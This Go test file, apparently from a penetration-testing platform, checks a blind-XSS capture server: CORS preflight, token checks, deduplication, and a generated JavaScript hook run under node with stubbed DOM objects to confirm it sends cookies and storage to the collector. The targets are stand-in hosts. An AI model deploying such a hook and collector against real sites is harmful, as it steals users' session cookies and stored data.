package app

import (
	"bytes"
	"context"
	"encoding/json"
	"io"
	"net"
	"net/http"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"jysecai/internal/config"
	"jysecai/internal/database"
	"jysecai/internal/xsshook"

	"go.uber.org/zap"
)

// startXSSCollectorForTest 启动收集器并返回其公网回调地址（实际监听端口）。
func startXSSCollectorForTest(t *testing.T, db *database.DB, cfg *config.XSSConfig) *xssCollectorRuntime {
	t.Helper()
	rt, err := startXSSCollector(db, cfg, zap.NewNop())
	if err != nil {
		t.Fatalf("startXSSCollector: %v", err)
	}
	if rt == nil {
		t.Fatal("collector not started (enabled=true expected)")
	}
	t.Cleanup(func() {
		ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
		defer cancel()
		rt.shutdown(ctx)
	})
	return rt
}

func TestXSSCaptureHTTPWithPreflightAndDedup(t *testing.T) {
	db, err := database.NewDB(filepath.Join(t.TempDir(), "xss-collector.db"), zap.NewNop())
	if err != nil {
		t.Fatal(err)
	}
	defer db.Close()

	enabled := true
	cfg := &config.XSSConfig{
		Enabled:         &enabled,
		BindHost:        "127.0.0.1",
		BindPort:        0, // 0 → 端口被 BindPortEffective 顶回 8877，这里改为起在随机端口
		PublicURL:       "", // 用实际监听地址
		Token:           "s3cret-token",
		CooldownSeconds: 30,
	}
	// BindPortEffective 对 <=0 回退 8877，可能与正在占用端口冲突 → 手动置一个随机端口。
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	port := ln.Addr().(*net.TCPAddr).Port
	_ = ln.Close()
	cfg.BindPort = port

	rt := startXSSCollectorForTest(t, db, cfg)
	base := "http://" + rt.ln.Addr().String()

	// 1) 浏览器预检：application/json + X-XSS-Token 必触发 OPTIONS，响应需放行方法与头。
	preflightURL := base + "/api/xss/capture"
	req, _ := http.NewRequest(http.MethodOptions, preflightURL, nil)
	req.Header.Set("Origin", "https://target.example")
	req.Header.Set("Access-Control-Request-Method", "POST")
	req.Header.Set("Access-Control-Request-Headers", "content-type,x-xss-token")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatalf("preflight: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusNoContent {
		t.Fatalf("preflight status = %d, want 204", resp.StatusCode)
	}
	if got := resp.Header.Get("Access-Control-Allow-Origin"); got != "*" {
		t.Fatalf("ACAO = %q, want *", got)
	}
	if got := resp.Header.Get("Access-Control-Allow-Headers"); !strings.Contains(strings.ToLower(got), "x-xss-token") {
		t.Fatalf("ACA-Headers lacks X-XSS-Token: %q", got)
	}

	// 2) 无 token → 403。
	if code := postCapture(t, base, "", `{"payload_id":"p1","source_url":"https://target.example/login"}`); code != http.StatusForbidden {
		t.Fatalf("no-token status = %d, want 403", code)
	}

	// 3) 错误 token → 403。
	if code := postCapture(t, base, "wrong", `{"payload_id":"p1","source_url":"https://target.example/login"}`); code != http.StatusForbidden {
		t.Fatalf("wrong-token status = %d, want 403", code)
	}

	// 4) 正确 token + 合法载荷 → 204 且入库、载荷状态 fired。
	payload, err := db.CreateXSSPayload(&database.XSSPayload{
		ID:     "p1",
		Name:   "login",
		Status: "armed",
	})
	if err != nil {
		t.Fatal(err)
	}
	body := `{"payload_id":"p1","source_url":"https://target.example/login","page_title":"Login","user_agent":"Mozilla/5.0","cookies":[{"name":"session","value":"abc=123"}],"local_storage":{"tk":"ls"},"session_storage":{}}`
	if code := postCapture(t, base, cfg.Token, body); code != http.StatusNoContent {
		t.Fatalf("valid capture status = %d, want 204", code)
	}
	caps, _, err := db.ListXSSCaptures(database.XSSListFilter{}, database.RBACListAccess{}, 0, 10)
	if err != nil {
		t.Fatal(err)
	}
	if len(caps) != 1 {
		t.Fatalf("captures = %d, want 1", len(caps))
	}
	if caps[0].ProjectID != "" || caps[0].Cookies[0].Value != "abc=123" || caps[0].LocalStorage["tk"] != "ls" {
		t.Fatalf("capture content mismatch: %#v", caps[0])
	}
	p, err := db.GetXSSPayload(payload.ID)
	if err != nil || p.Status != "fired" {
		t.Fatalf("payload status = %#v err=%v, want fired", p, err)
	}

	// 5) 冷却窗内同一来源重复回连 → 204 且不新增记录。
	if code := postCapture(t, base, cfg.Token, body); code != http.StatusNoContent {
		t.Fatalf("dedup capture status = %d, want 204", code)
	}
	if caps, _, err := db.ListXSSCaptures(database.XSSListFilter{}, database.RBACListAccess{}, 0, 10); err != nil || len(caps) != 1 {
		t.Fatalf("after dedup captures = %d err=%v, want 1", len(caps), err)
	}

	// 6) query token 兜底可用。
	altURL := base + "/api/xss/capture?token=" + cfg.Token
	post, _ := http.NewRequest(http.MethodPost, altURL, bytes.NewBufferString(`{"source_url":"https://other.example/x"}`))
	post.Header.Set("Content-Type", "application/json")
	ar, err := http.DefaultClient.Do(post)
	if err != nil {
		t.Fatal(err)
	}
	ar.Body.Close()
	if ar.StatusCode != http.StatusNoContent {
		t.Fatalf("query-token status = %d, want 204", ar.StatusCode)
	}
}

func TestXSSCaptureRejectsNonJSON(t *testing.T) {
	db, err := database.NewDB(filepath.Join(t.TempDir(), "xss-collector-bad.db"), zap.NewNop())
	if err != nil {
		t.Fatal(err)
	}
	defer db.Close()
	enabled := true
	cfg := &config.XSSConfig{Enabled: &enabled, BindHost: "127.0.0.1", Token: "tk", CooldownSeconds: 0}
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	cfg.BindPort = ln.Addr().(*net.TCPAddr).Port
	_ = ln.Close()
	rt := startXSSCollectorForTest(t, db, cfg)
	base := "http://" + rt.ln.Addr().String()

	// 非法 JSON → 400。
	if code := postCapture(t, base, "tk", `not json{`); code != http.StatusBadRequest {
		t.Fatalf("bad json status = %d, want 400", code)
	}
	// 缺 source_url → 400。
	if code := postCapture(t, base, "tk", `{"payload_id":"p"}`); code != http.StatusBadRequest {
		t.Fatalf("missing source_url status = %d, want 400", code)
	}
	// 非 POST → 405。
	req, _ := http.NewRequest(http.MethodGet, base+"/api/xss/capture", nil)
	g, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	g.Body.Close()
	if g.StatusCode != http.StatusMethodNotAllowed {
		t.Fatalf("GET status = %d, want 405", g.StatusCode)
	}
}

func postCapture(t *testing.T, base, token, rawBody string) int {
	t.Helper()
	req, err := http.NewRequest(http.MethodPost, base+"/api/xss/capture", bytes.NewBufferString(rawBody))
	if err != nil {
		t.Fatal(err)
	}
	req.Header.Set("Content-Type", "application/json")
	if token != "" {
		req.Header.Set("X-XSS-Token", token)
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	_, _ = io.Copy(io.Discard, resp.Body)
	return resp.StatusCode
}

func TestXSSHookJSGeneratesCaptureBody(t *testing.T) {
	// 用 xsshook 生成真实脚本并用 node 实际执行（DOM stub），验证 JS 能拼出正确请求体。
	script := xsshook.Build(xsshook.BuildOptions{
		PayloadID: "e2e-pid",
		BeaconURL: "http://127.0.0.1:9",
		Token:     "e2e-tk",
	})
	driver := `
const captured = [];
const location = { href: 'https://target.example/login', hash: '#frag' };
const localStorage = { getItem: (k) => ({a:'1'})[k] };
const sessionStorage = { getItem: () => '2' };
const document = { title: 'Page Title', cookie: 'session=abcd; theme=dark', readyState: 'complete', location: { href: 'https://target.example/login', hash: '#frag' } };
const navigator = { userAgent: 'test-ua' };
const XMLHttpRequest = function() {
  this.open = function(m, u) { this.m = m; this.u = u; };
  this.setRequestHeader = function(k, v) { this.headers = this.headers || {}; this.headers[k] = v; };
  this.send = function(b) { captured.push({ m: this.m, u: this.u, h: this.headers, b: JSON.parse(b) }); };
};
` + script + `
const cap = captured[0];
console.log(JSON.stringify({ url: cap.u, token: cap.h['X-XSS-Token'], body: cap.b }));
`
	out, err := runNode(t, driver)
	if err != nil {
		t.Fatalf("node exec: %v\n%s", err, out)
	}
	var got struct {
		URL   string       `json:"url"`
		Token string       `json:"token"`
		Body  xsshook.CaptureRequest `json:"body"`
	}
	if err := json.Unmarshal([]byte(out), &got); err != nil {
		t.Fatalf("parse node output: %v\n%s", err, out)
	}
	if got.Token != "e2e-tk" || !strings.HasSuffix(got.URL, "/api/xss/capture") {
		t.Fatalf("node exec mismatch: %+v", got)
	}
	ck := map[string]string{}
	for _, c := range got.Body.Cookies {
		ck[c.Name] = c.Value
	}
	if ck["session"] != "abcd" || ck["theme"] != "dark" {
		t.Fatalf("cookie parse mismatch: %#v", got.Body.Cookies)
	}
	if got.Body.SourceURL != "https://target.example/login" || got.Body.PayloadID != "e2e-pid" {
		t.Fatalf("body mismatch: %+v", got.Body)
	}
}

func runNode(t *testing.T, code string) (string, error) {
	t.Helper()
	cmd := "node"
	if _, err := exec.LookPath(cmd); err != nil {
		t.Skip("node not available")
	}
	c := exec.Command(cmd, "-e", code)
	c.Stderr = bytes.NewBuffer(nil)
	var stdout bytes.Buffer
	c.Stdout = &stdout
	err := c.Run()
	return strings.TrimSpace(stdout.String()) + "\n" + c.Stderr.(*bytes.Buffer).String(), err
}